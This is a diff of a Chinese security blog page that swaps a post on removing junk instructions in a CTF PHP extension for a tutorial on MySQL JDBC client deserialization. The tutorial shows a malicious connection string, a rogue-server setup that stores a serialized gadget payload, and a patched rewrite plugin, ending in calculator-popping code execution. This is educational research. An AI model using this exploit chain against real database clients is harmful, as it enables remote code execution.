@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>逆向花指令入门 - Twings</title>
+  <title>MySQL JDBC 客户端反序列化 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期一, 六月 29日 2020, 3:20 下午
+                  星期四, 七月 2日 2020, 12:50 下午
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    947 字
+                    1k 字
                   </span>
                 
 
@@ -162,86 +162,139 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前 De1CTF 的 web 扩展题，当时下载扩展 IDA 打开，然后看着反编译代码就懵了，不知道是个什么逻辑。</p>
-<p>后来才知道题目是加入了简单的花指令来干扰 IDA 的分析，看了 writeup 之后打算自己动手解一下。</p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 挺有意思的 Java 反序列化利用方式，有种 PHP 的 MySQL phar 反序列化的感觉，学习学习。</p>
 <a id="more"></a>
 <hr>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>分析工具：IDA 7.0</p>
-<p>下载扩展：<a href="https://raw.githubusercontent.com/De1ta-team/De1CTF2020/master/writeup/web/mixtrue/docker.zip" target="_blank" rel="noopener">https://raw.githubusercontent.com/De1ta-team/De1CTF2020/master/writeup/web/mixtrue/docker.zip</a></p>
-<p>用 IDA 打开，按照开发 PHP 扩展的经验直接定位到 zif_Minclude 函数，F5 反编译一下，结果看到：</p>
-<pre><code class="c">void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
-{
-  ((void (__fastcall *)(zend_execute_data *, zval *, zend_execute_data *))l2)(execute_data, return_value, execute_data);
-  JUMPOUT(*(_QWORD *)&amp;byte_1245);
-}
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>简单地新建一个 Java 类，配置好编译输出目录和 maven：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;mysql&lt;/groupId&gt;
+    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+    &lt;version&gt;8.0.19&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.2.1&lt;/version&gt;
+&lt;/dependency&gt;
 </code></pre>
-<p>这反编译出来的代码跟印象中的 PHP 扩展代码完全不一样，回去看反编译前的指令，看到一个红色错误：</p>
-<pre><code>zif_Minclude    endp ; sp-analysis failed
-</code></pre><p>说明这里可能存在花指令或者其他东西影响了 IDA 的分析，可以看到 IDA 看到 call l2，将 l2 当作了一个函数，然后认为函数返回之后的下一条指令是：</p>
-<pre><code class="assembly">db 0EAh
-</code></pre>
-<p>这样一来反编译出来的代码就完全错误了，而机器执行的代码还是正常的，所以这里的花指令可以自己看汇编代码理清流程来去除，像我这样对汇编、栈和函数调用不是很熟悉的人就只能用 gdb 调试 php 扩展来看了。</p>
-<p>修改 php.ini 加载扩展，然后 gdb 调试，要提一点的是 php 加载 so 扩展是运行时加载，所以给扩展里的函数要下断点需要在调用该函数之前让 php 停下来，比如在前面加个 var_dump 然后给 php_var_dump 下个断点，再在运行触发断点的时候给该函数下断点。</p>
-<p>看一遍就会发现，根源就在于 call 之后的地方：</p>
-<pre><code class="assembly">pop     rax
-add     rax, 8
-push    rax
-</code></pre>
-<p>这里 pop 出来的其实是 call l2 之后的返回地址，即 0x245，而修改之后再入栈则相当于将返回地址改为了 0x24D，而 IDA 静态分析不会发现返回地址被更改了，所以还是 0x245 的错误地址。</p>
-<p>所以要去除这里的花指令，就是将 0x22E 到 0x24D 的指令都 nop 掉，然后 undefined，重新创建函数。</p>
-<p>这时会发现另一个问题：</p>
-<pre><code>.text:00000000000012E2: The function has undefined instruction/data at the specified address.
-</code></pre><p>定位过去看看，是一段无法识别的跳转指令，因为它的操作数需要四个字节的数据作为跳转的地址，而后面的数据已经被识别为了 next 标签的指令，这里我们将它直接 nop 掉，然后再创建。</p>
-<p>然后发现，另外一个地址出现了同样的错误，阅读汇编代码之后会发现是个相同的花指令，去除之后再创建，可以发现创建成功了，再 F5 反编译：</p>
-<pre><code class="c">void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
-{
-  zval *v2; // r12
-  unsigned __int64 v3; // rsi
-  FILE *v4; // rbx
-  __int64 v5; // rax
-  void *src; // [rsp+0h] [rbp-98h]
-  size_t n; // [rsp+8h] [rbp-90h]
-  char dest; // [rsp+10h] [rbp-88h]
-  int v9; // [rsp+70h] [rbp-28h]
-  char *v10; // [rsp+74h] [rbp-24h]
+<p>然后编写测试代码：</p>
+<pre><code class="java">import java.sql.*;
 
-  v2 = return_value;
-  memset(&amp;dest, 0, 0x60uLL);
-  v9 = 0;
-  v10 = &amp;dest;
-  if ( (unsigned int)zend_parse_parameters(execute_data-&gt;This.u2.next, &quot;s&quot;, &amp;src, &amp;n) != -1 )
-  {
-    memcpy(&amp;dest, src, n);
-    php_printf(&quot;%s&quot;, &amp;dest);
-    php_printf(&quot;&lt;br&gt;&quot;, &amp;dest);
-    v3 = (unsigned __int64)&quot;rb&quot;;
-    v4 = fopen(&amp;dest, &quot;rb&quot;);
-    if ( v4 )
-    {
-      while ( !feof(v4) )
-      {
-        v3 = (unsigned int)fgetc(v4);
-        php_printf(&quot;%c&quot;, v3);
-      }
-      php_printf(&quot;\n&quot;, v3);
+public class JDBC {
+    public static void main ( String[] argv ) throws Exception {
+        String url = &quot;jdbc:mysql://*.*.*.*:*/jdbc?useSSL=false&amp;user=root&amp;password=root&amp;&quot; +
+                &quot;autoDeserialize=true&amp;allowPublicKeyRetrieval=true&amp;&quot; +
+                &quot;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;
+        Connection conn = DriverManager.getConnection(url);
     }
-    else
-    {
-      php_printf(&quot;no file\n&quot;, &quot;rb&quot;);
-    }
-    v5 = zend_strpprintf(0LL, &quot;True&quot;);
-    v2-&gt;value.lval = v5;
-    v2-&gt;u1.type_info = (*(_BYTE *)(v5 + 5) &amp; 2u) &lt; 1 ? 5126 : 6;
-  }
 }
 </code></pre>
-<p>可以看到已经是正常的代码了。</p>
+<p>DriverManager 会通过 SPI 的方式加载 MySQL 驱动，不需要像参考文章那样加一句：</p>
+<pre><code class="java">String driver = &quot;com.mysql.jdbc.Driver&quot;;
+Class.forName(driver);
+</code></pre>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>ServerStatusDiffInterceptor 类的 populateMapWithSessionStatusValues 函数会执行一句 SQL 语句，然后将执行结果放入 Map 中：</p>
+<pre><code class="java">private void populateMapWithSessionStatusValues(Map&lt;String, String&gt; toPopulate) {
+    java.sql.Statement stmt = null;
+    java.sql.ResultSet rs = null;
+
+    try {
+        try {
+            toPopulate.clear();
+
+            stmt = this.connection.createStatement();
+            rs = stmt.executeQuery(&quot;SHOW SESSION STATUS&quot;);
+            ResultSetUtil.resultSetToMap(toPopulate, rs);
+        }
+        ...
+    } 
+    ...
+}
+</code></pre>
+<p>而 resultSetToMap 函数会调用 ResultSet 接口实现的 getObject：</p>
+<pre><code class="java">public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {
+    while (rs.next()) {
+        mappedValues.put(rs.getObject(1), rs.getObject(2));
+    }
+}
+</code></pre>
+<p>这里调用的是 ResultSetImpl 类的 getObject，当字段类型为 BIT 或者  BLOB 的时候，会进行反序列化：</p>
+<pre><code class="java">case BLOB:
+if (field.isBinary() || field.isBlob()) {
+    byte[] data = getBytes(columnIndex);
+
+    if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {
+        Object obj = data;
+
+        if ((data != null) &amp;&amp; (data.length &gt;= 2)) {
+            if ((data[0] == -84) &amp;&amp; (data[1] == -19)) {
+                // Serialized object?
+                try {
+                    ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
+                    ObjectInputStream objIn = new ObjectInputStream(bytesIn);
+                    obj = objIn.readObject();
+                    objIn.close();
+                    bytesIn.close();
+                } 
+                ...
+            } else {
+                return getString(columnIndex);
+            }
+        }
+
+        return obj;
+    }
+
+    return data;
+}
+
+return getBytes(columnIndex);
+</code></pre>
+<p>而 ServerStatusDiffInterceptor 类是实现了 QueryInterceptor 接口的一个类，这个接口代表的是 MySQL 连接串中的一个参数，<a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" target="_blank" rel="noopener">官方文档</a>中对这个参数的描述是：</p>
+<pre><code>queryInterceptors
+
+A comma-delimited list of classes that implement &quot;com.mysql.cj.interceptors.QueryInterceptor&quot; that should be placed &quot;in between&quot; query execution to influence the results. QueryInterceptors are &quot;chainable&quot;, the results returned by the &quot;current&quot; interceptor will be passed on to the next in in the chain, from left-to-right order, as specified in this property.
+
+Since version: 8.0.7
+</code></pre><p>简单来说就是在 SQL 查询之间插入的 SQL 操作，而建立连接时会执行的 set autocommit=1 等操作正好可以触发，所以如果可以控制 JDBC 连接串，就可以通过设置 queryInterceptors 的方式让客户端反序列化我们返回的数据，具体危害程度由客户端的环境决定。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以参考这位大师傅的做法：<a href="https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload" target="_blank" rel="noopener">https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload</a></p>
+<p>也可以用这个工具：<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p>自己建立一个数据表存放序列化攻击数据，然后通过 MySQL 插件将 SHOW SESSION STATUS 请求重写为从该表中 select 数据，从而达到控制返回数据的目的。</p>
+<p>用 docker 开一个 MySQL，首先新建一个表用来存放序列化数据：</p>
+<pre><code class="mysql">mysql&gt; create database jdbc;
+Query OK, 1 row affected (0.03 sec)
+
+mysql&gt; use jdbc;
+Database changed
+mysql&gt; create table jdbc(data1 blob, data2 blob);
+Query OK, 0 rows affected (0.02 sec)
+
+mysql&gt; set @bytes=0xaced...78;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; insert into jdbc values(@bytes, @bytes);
+Query OK, 1 row affected (0.01 sec)
+</code></pre>
+<p>然后嫌麻烦不想自己编译一个新的扩展，所以直接使用 GitHub 上给出的扩展，然后用 IDA 简单地 patch 一下修改掉字符串，最后大概变成了这个样子：</p>
+<pre><code class="c">v4 = strcasecmp(v3, &quot;SHOW SESSION STATUS&quot;) == 0;
+std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v14, &quot;SHOW SESSION STATUS&quot;);
+std::allocator&lt;char&gt;::~allocator(&amp;v10);
+if ( v4 ){
+    strcpy(s, &quot;select `data1`, `data2` from jdbc.jdbc;#NAME`, `ID`, `IS_DEFAULT`, `IS_COMPILED`, `SORTLEN` from codeplutos.payload&quot;);
+    v5 = (__int64 (__fastcall *)(_QWORD, size_t, _QWORD))*mysql_malloc_service;
+    ...
+}
+...
+</code></pre>
+<p>然后将扩展装上去试一发：</p>
+<pre><code class="sql">mysql&gt; install plugin rewrite_example soname &quot;rewrite_example.so&quot;;
+mysql&gt; SHOW SESSION STATUS;
+</code></pre>
+<p>可以看到重写已经生效了，最后用 IDEA 来一发，可以看到成功弹出计算器，实验成功。</p>
 <hr>
 <p>参考文章：</p>
-<p><a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-III/Chapter-50.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-III/Chapter-50.html</a></p>
-<p><a href="https://www.52pojie.cn/thread-1068444-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1068444-1-1.html</a></p>
-<p><a href="https://www.anquanke.com/post/id/208682" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208682</a></p>
-<p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/</a></p>
+<p><a href="https://paper.seebug.org/1227" target="_blank" rel="noopener">https://paper.seebug.org/1227</a></p>
+<p><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a></p>
 
             </div>
             <hr>
@@ -252,9 +305,7 @@ push    rax
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Re/">Re</a>
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
                   </span>
                 
@@ -266,16 +317,11 @@ push    rax
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2020/07/02/MySQL-JDBC-客户端反序列化/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>MySQL JDBC 客户端反序列化</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2020/06/23/安装vld扩展查看opcode/">
-                        <span>安装vld扩展查看opcode</span>
+                      <a href="/2020/06/29/逆向花指令入门/">
+                        <span>逆向花指令入门</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -446,7 +492,7 @@ push    rax
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "逆向花指令入门&nbsp;",
+        "MySQL JDBC 客户端反序列化&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
